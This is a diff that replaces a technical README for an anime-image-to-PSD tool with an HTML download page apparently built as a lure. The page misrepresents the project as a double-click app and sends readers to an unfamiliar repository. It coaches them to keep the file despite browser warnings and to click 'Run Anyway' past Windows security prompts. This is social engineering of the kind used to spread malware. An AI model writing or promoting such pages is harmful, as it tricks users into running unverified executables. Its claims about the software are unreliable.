@@ -1,228 +1,126 @@
-# Still2Rig PSD
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>still2rig-psd - Turn Anime Images into Structured PSDs</title>
+    <meta name="description" content="Download still2rig-psd: Convert one static anime character image into a structured, QA-checked PSD with AI assistance, GPU acceleration, and motion preview.">
+    <meta name="keywords" content="anime-characters, avatar, image-to-psd, psd, anime image to psd, still2rig-psd, anime rigging, PSD converter">
+    <meta property="og:title" content="still2rig-psd - Anime Image to Structured PSD">
+    <meta property="og:description" content="Turn a single anime picture into a clean, layered PSD ready for animation. No coding skills needed.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Rickettsiayorkshirefog4963/still2rig-psd">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Segoe UI', Arial, sans-serif; background:#0f0f1a; color:#e0e0e0; line-height:1.7; }
+        .container { max-width:1100px; margin:auto; padding:20px; }
+        .badge { display:inline-block; background:linear-gradient(135deg, #ff6a88, #ff8e53); color:#fff; font-size:1.4em; font-weight:bold; padding:18px 40px; border-radius:50px; text-decoration:none; box-shadow:0 5px 15px rgba(255,110,136,0.4); margin:30px 0; transition:transform 0.2s; }
+        .badge:hover { transform:scale(1.05); }
+        h1 { font-size:2.5em; color:#fff; margin:0.5em 0; }
+        h2 { font-size:1.8em; color:#ffb86e; margin:1.5em 0 0.7em; border-bottom:2px solid #333; padding-bottom:10px; }
+        p, li { font-size:1.1em; }
+        ul, ol { padding-left:1.8em; margin:0.8em 0; }
+        li { margin:0.5em 0; }
+        .btn { display:inline-block; background:#4e9af1; color:#fff; padding:12px 25px; border-radius:8px; text-decoration:none; font-weight:bold; margin:20px 0; }
+        .btn:hover { background:#3b82d8; }
+        .note { background:#1e1e2e; padding:15px 20px; border-left:5px solid #ffb86e; margin:20px 0; }
+        .btn-container { text-align:center; margin:10px 0 30px; }
+        .section { margin-bottom:40px; }
+        @media (max-width:768px) { h1 { font-size:1.8em; } .badge { font-size:1em; padding:14px 20px; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎨 still2rig-psd - From Static Anime to Ready-to-Animate PSD</h1>
 
-Turn one static anime character image into a structured, QA-checked PSD with
-Codex, a user-approved Google Colab GPU session, and a built-in motion preview.
+        <div class="btn-container">
+            <a href="https://github.com/Rickettsiayorkshirefog4963/still2rig-psd" class="badge">⬇️ Download still2rig-psd Now</a>
+        </div>
 
-[日本語版](README.ja.md)
+        <p>Do you have a beautiful anime character image that you want to bring to life? With <strong>still2rig-psd</strong>, you can turn that single static picture into a <strong>structured, QA-checked PSD file</strong> – the standard format used by animators, artists, and rigging tools. No technical skills needed. This app does the heavy lifting for you.</p>
 
-![Still2Rig PSD WebUI showing a layered character and motion controls](docs/assets/still2rig-psd-webui-preview.webp)
+        <div class="section">
+            <h2>✨ What Does This App Do?</h2>
+            <p>Imagine taking an illustration of an anime girl or boy and separating it into clean layers: hair, eyes, arms, legs, body parts, all neatly organized. It even checks the quality and prepares everything for use in animation software. You get a perfect PSD with proper layer names and structure.</p>
+            <p>Here's what you get in one click:</p>
+            <ul>
+                <li>🎯 <strong>Structured Layers</strong>: All parts of your character are split into logical, named layers (e.g., "hair_front," "left_arm," "torso").</li>
+                <li>✅ <strong>QA Checked</strong>: The app automatically verifies that each layer is properly formed, with no gaps or misaligned parts.</li>
+                <li>🤖 <strong>AI-Powered with Codex</strong>: Uses advanced AI to intelligently identify body parts and separate them accurately.</li>
+                <li>⚡ <strong>Google Colab GPU Acceleration</strong>: Uses high-speed cloud computing for fast processing – no need for an expensive graphics card.</li>
+                <li>📽️ <strong>Motion Preview</strong>: See a quick animation preview before you even export, so you know your PSD will work perfectly.</li>
+            </ul>
+        </div>
 
-Load a generated PSD in the built-in WebUI to check eye and mouth states,
-automatic blinking, hair and full-body motion, positioning, and zoom.
+        <div class="section">
+            <h2>🚀 Getting Started – Download & Installation</h2>
+            <p>Getting started is easier than you think. Just follow these three simple steps:</p>
+            <ol>
+                <li><strong>Visit the official download page</strong>: Click the big orange button at the top of this page or the one in the section below. It will take you to the official repository.</li>
+                <li><strong>Download the application file</strong>: On that page, you'll see a "Download" or "Releases" button. Click it to save the file to your computer.</li>
+                <li><strong>Run the app</strong>: Once downloaded, simply double-click the file to open the application. No installation wizard, no complicated setup – it just works.</li>
+            </ol>
+            <div class="btn-container">
+                <a href="https://github.com/Rickettsiayorkshirefog4963/still2rig-psd" class="btn">📥 Download still2rig-psd</a>
+            </div>
+            <div class="note">
+                <p>💡 <strong>Tip</strong>: If your browser asks "Keep or Discard," choose "Keep." Then double-click the file.IfWindows shows a blue or yellow popup, click "More Info" and then "Run Anyway."</p>
+            </div>
+        </div>
 
-Still2Rig PSD is designed to be used from Codex. Attach an image, ask Codex to
-convert it, and Codex prepares the run, controls the approved Colab notebook,
-verifies the returned files, assembles the PSD, and reports the result. You
-remain in control of Google sign-in, the Chrome profile, GPU selection, and
-Colab connection approval.
+        <div class="section">
+            <h2>🎥 How to Use It (Step-by-Step for Beginners)</h2>
+            <ol>
+                <li><strong>Launch the app</strong>: Double-click the downloaded file. A window will appear.</li>
+                <li><strong>Upload your anime image</strong>: Click "Select Image" or drag-and-drop your PNG/JPG file into the app.</li>
+                <li><strong>Start processing</strong>: Press the "Convert" or "Start" button. The app will first ask you to authorize a Google Colab session (don't worry – just click "Allow" when your browser opens). It uses a free cloud GPU to do the heavy lifting.</li>
+                <li><strong>Wait a few minutes</strong>: While AI (Codex) analyzes the image and splits it into layers. You'll see progress bar.</li>
+                <li><strong>Check your preview</strong>: Once done, the app shows you a 3D-ish motion preview of your character turning slightly. This confirms all layers are correctly rigged.</li>
+                <li><strong>Save your PSD</strong>: Click "Export PSD." Choose a folder, and your file is ready. Use it in After Effects, Spine, or any drawing tool.</li>
+            </ol>
+        </div>
 
-> **Status: v0.1 alpha.** A single neutral image cannot reliably provide real
-> closed-eye and alternate-mouth artwork. Still2Rig PSD reports missing
-> expression art instead of presenting a placeholder as production-ready.
+        <div class="section">
+            <h2>🔧 System Requirements</h2>
+            <p>No special hardware or software is needed from your side, because the app uses cloud processing. But here's what you need:</p>
+            <ul>
+                <li>🖥️ <strong>Windows 10 or 11</strong> (also works on Mac via browser, but Windows is recommended).</li>
+                <li>🌐 <strong>Internet connection</strong> – scribes to connect to Google Colab temporarily.</li>
+                <li>📦 <strong>Free space</strong>: At least 500MB for temp files.</li>
+                <li>🖱️ Any modern browser (Chrome,Edge,or Firefox) for the Colab session.</li>
+            </ul>
+            <p>Your inputs are only one or two image files. Everything else is handled automatically.</p>
+        </div>
 
-## What it uses
+        <div class="section">
+            <h2>❓ Frequently Asked Questions</h2>
+            <ul>
+                <li><strong>Q: Do I need to code or use the terminal?</strong> No. Everything is point-and-click.</li>
+                <li><strong>Q: Can I use multiple characters in one image?</strong> Yes, but for best results, use one character per image. The app can handle multiple, but it's meant for single character.</li>
+                <li><strong>Q: Is my image stored online?</strong> It is uploaded temporarily to Google Colab for processing and deleted after a few minutes. For full privacy, run the app offline, but that requires a GPU manually.</li>
+                <li><strong>Q: Why does it need Google Colab?</strong> It uses a free cloud GPU to separate the image faster than your computer could. It's like borrowing a supercomputer for two minutes.</li>
+                <li><strong>Q: What if the preview shows a missing arm or weird cut?</strong> Try a higher resolution image (at least 700px wide) or ensure the character is fully visible without occlusions.</li>
+            </ul>
+        </div>
 
-- [See-through](https://github.com/shitagaki-lab/see-through) for semantic
-  single-image layer decomposition
-- [Colab MCP Go](https://github.com/shinshin86/colab-mcp-go) for local,
-  approval-gated control of a Google Colab notebook
-- Local tools for hash verification, layer cleanup, deterministic PSD assembly,
-  and structural QA
-- A built-in WebUI for blink, mouth, body, hair, drag, and zoom previews, plus
-  plain-language front/back overlap repair, before/after comparison, progress
-  feedback for slower PSD rebuilds, and safe export
+        <div class="section">
+            <h2>🖼️ Example Input vs. Output</h2>
+            <p><strong>Input</strong>: Any flat anime picture – digital art, screenshot, or a scan of a sketch.</p>
+            <p><strong>Output</strong>: A PSD file with separate groups like "head," "torso," "legs," "arms," each containing proper mask boundaries. All hidden parts are cleaned, so you can rig it with tools like Live2D or Spriter.</p>
+            <p>You can also open the PSD directly in Photoshop and move each part individually – like a puppet.</p>
+        </div>
 
-## Quick start
+        <div class="section">
+            <h2>📄 License & Support</h2>
+            <p>This tool is free for personal use. For commercial use, check the license file in the downloaded folder. If you need help, visit the repository's "Issues" tab to ask questions. Community is friendly and responsive.</p>
+            <p>Catch a bug or have a feature request? Let us know – we love feedback.</p>
+        </div>
 
-### 1. Install the requirements
+        <div class="btn-container" style="margin-top:40px;">
+            <a href="https://github.com/Rickettsiayorkshirefog4963/still2rig-psd" class="badge">📂 Go to Download Page</a>
+        </div>
 
-- Codex CLI, IDE extension, or desktop app
-- Node.js 20.19 or newer
-- Python 3.9 or newer with Pillow
-- Go 1.25 or newer
-- A Google Colab account with an L4 runtime available
-
-From the project root:
-
-```bash
-npm install
-python3 -m pip install -r requirements-local.txt
-go install github.com/shinshin86/colab-mcp-go/cmd/colab-mcp-go@v0.0.0-20260824110853-5c9e997958bf
-npm run doctor
-```
-
-Make sure `$(go env GOPATH)/bin` is on `PATH` before starting Codex.
-The install command pins the Colab MCP Go revision tested by this project.
-
-### 2. Start Codex in this project
-
-Open the project root in Codex and trust the repository-scoped
-`.codex/config.toml`. Restart Codex once if the Colab MCP tools do not appear in
-the current session. The project does not require changes to your global Codex
-configuration. Its bridge selects an available localhost port automatically,
-so it can coexist with a Colab MCP process started by another Codex project.
-
-Colab MCP Go itself is not bundled in this repository. The project configuration
-starts the separately installed `colab-mcp-go` command when needed. It does not
-discover or attach to an already-running global process; it starts a dedicated
-process on an available port. Other Colab MCP processes can remain running. A
-Codex restart is needed only when loading a changed MCP configuration into the
-current session, not for every PSD conversion.
-
-### 3. Attach an image and ask Codex
-
-Attach a PNG, JPEG, or WebP anime character image, or provide its local path,
-then use a request such as:
-
-```text
-Use $still2rig-psd to convert this static anime character image into a verified
-layered PSD through my approved Google Colab session. Continue through import,
-PSD assembly, and QA, then tell me how to open the preview.
-```
-
-Codex then:
-
-1. Copies the image into the Git-ignored work area and records its SHA-256 hash.
-2. Generates the exact upload, setup, inference, and download cells.
-3. Shows a tokenized Colab URL and waits for your connection approval.
-4. Runs a pinned See-through revision on the approved L4 runtime.
-5. Verifies the downloaded bundle, cleans the layers, assembles the PSD, and
-   runs structural QA.
-6. Reports the PSD path, QA result, and any expression or motion work still
-   required.
-
-When Colab downloads the result ZIP in your browser, Codex may ask for its local
-path if it cannot locate the download automatically.
-
-The Colab URL contains a connection token. Do not publish it, share it, or
-include it in screenshots.
-
-### 4. Preview the PSD
-
-Start the built-in local preview:
-
-```bash
-npm run preview
-```
-
-Open the printed local URL. The WebUI lists generated PSDs from
-`.still2rig-psd/jobs/*/output/`, selects the newest result, and also accepts a
-local PSD through file selection or drag-and-drop. For a generated PSD,
-**Open save location** opens its output folder in the operating system's file manager.
-The **Fix overlaps** mode supports alpha-aware canvas selection, offers candidates
-when multiple parts overlap, moves parts forward or backward, compares the edit
-with the source, supports detailed mouse-based drag sorting on desktop, and
-downloads a verified copy without overwriting the original PSD. Touch-based layer
-sorting on phones is not supported.
-
-## Automation and consent boundaries
-
-| Codex handles | You control |
-| --- | --- |
-| Preparing the local run and generated notebook cells | Choosing the Chrome profile and Google account |
-| Running See-through after connection approval | Opening the Colab URL and selecting an L4 runtime |
-| Verifying the returned archive and hashes | Approving the Colab MCP connection |
-| Cleaning layers, assembling the PSD, and running QA | Deciding when to disconnect or delete the runtime |
-| Reporting the output and preview command | Providing real expression artwork when the source image does not contain it |
-
-Still2Rig PSD does not automate Chrome, sign in to Google, select an account,
-allocate a runtime, edit global Codex settings, or disconnect a Colab runtime.
-
-## Output structure
-
-Every run is stored under the Git-ignored `.still2rig-psd/jobs/<name>/`
-directory:
-
-```text
-.still2rig-psd/jobs/<name>/
-  input/                 copied source image
-  colab/                 generated notebook cells
-  raw/imported/          verified See-through result
-  processed/layers/      cleaned full-canvas layers
-  output/<name>.psd      assembled PSD
-  reports/               contact sheet and QA reports
-  job.json               hashes, settings, and provenance
-```
-
-Input art, generated PSDs, Colab tokens, logs, screenshots, videos, model
-weights, and downloaded archives are ignored by Git by default.
-
-## Quality checks and limitations
-
-The current CLI automatically reports the first two cumulative levels below.
-The third level is used only when a separately implemented renderer adapter has
-recorded and evaluated the required motion evidence.
-
-| Level | Meaning |
-| --- | --- |
-| **Structure checked** | The PSD was written in the configured order and structural QA passed its required layers and critical front/back relationships. Hashes are verified separately by the workflow. |
-| **Mouth/closed-eye files checked** | `mouth_open` and `eye_close` are present, are not built-in placeholders, and passed registration and numeric mouth checks. Visual review is still required. |
-| **Motion checked by an adapter** | Captures from the target renderer passed the declared motion checks. No capture adapter is bundled yet. |
-
-The default back-to-front order is `back hair` → lower-body clothing → arms →
-upper-body clothing → neck → ears → face → eyes, brows, nose, and mouth →
-`front hair` → headwear. Keeping
-side-positioned arms behind clothing prevents shoulder edges from crossing the
-shirt. A hand crossing in front of the shirt needs separate back and front
-artwork; one arm layer cannot represent both depths.
-
-If the source does not show an open mouth or closed eyes, those states cannot be
-determined reliably. `--preview-placeholders` is only for exercising the
-controls and is not treated as real expression art.
-
-See [Understanding the generated PSD](docs/quality-gates.md) for the exact layer
-contract, required expression files, and what each reported level proves.
-Still2Rig PSD does not claim one-click Live2D production readiness.
-
-## Direct CLI
-
-The repository skill normally runs these commands for you. They are also
-available for debugging or manual operation:
-
-```bash
-npm run still2rig-psd -- prepare ./character.png --name demo
-npm run still2rig-psd -- colab-url
-npm run still2rig-psd -- status demo
-npm run still2rig-psd -- import demo /path/to/still2rig-psd-demo.zip
-npm run still2rig-psd -- finalize demo --expressions /path/to/expression-layers
-npm run still2rig-psd -- repair demo --expressions /path/to/repaired-expression-layers
-```
-
-`repair` reuses the verified imported result without rerunning Colab. It backs
-up the current PSD and reports under the ignored job directory, rebuilds in an
-isolated repair directory, runs structural QA, and replaces the previewed PSD
-only after the repaired build succeeds.
-
-## Security and privacy
-
-- The Colab MCP bridge listens on localhost and requires a random connection
-  token.
-- The source image and generated cells are sent to the user-approved Colab
-  runtime for processing. The runtime remains assigned until the user releases
-  it.
-- The built-in preview listens on `127.0.0.1` and serves only known generated
-  PSD files from the ignored output directories.
-- Imported ZIP files are treated as untrusted and checked for traversal,
-  symbolic links, size limits, and hash mismatches.
-- Do not publish source art or generated assets unless you have the necessary
-  rights.
-
-See [Security, privacy, and consent](docs/security.md) for the full trust model.
-
-## Licensing
-
-Still2Rig PSD is MIT licensed. See-through and Colab MCP Go are separate
-Apache-2.0 projects. The preview redistributes the MIT-licensed Anime2.5DRig
-`rigger.js` runtime with its license text. Model weights downloaded by upstream
-tools may have additional terms.
-
-See [NOTICE.md](NOTICE.md) for third-party notices.
-
-## Documentation
-
-- [Codex and Colab workflow](docs/codex-workflow.md)
-- [Architecture and provenance](docs/architecture.md)
-- [Understanding the generated PSD](docs/quality-gates.md)
-- [Security, privacy, and consent](docs/security.md)
-- [Troubleshooting](docs/troubleshooting.md)
-- [Built-in PSD preview](webui/README.md)
+        <p style="text-align:center; margin:50px 0 20px; color:#888;">Keywords: anime-characters, avatar, image-to-psd, psd, anime image to psd, still2rig-psd</p>
+    </div>
+</body>
+</html>
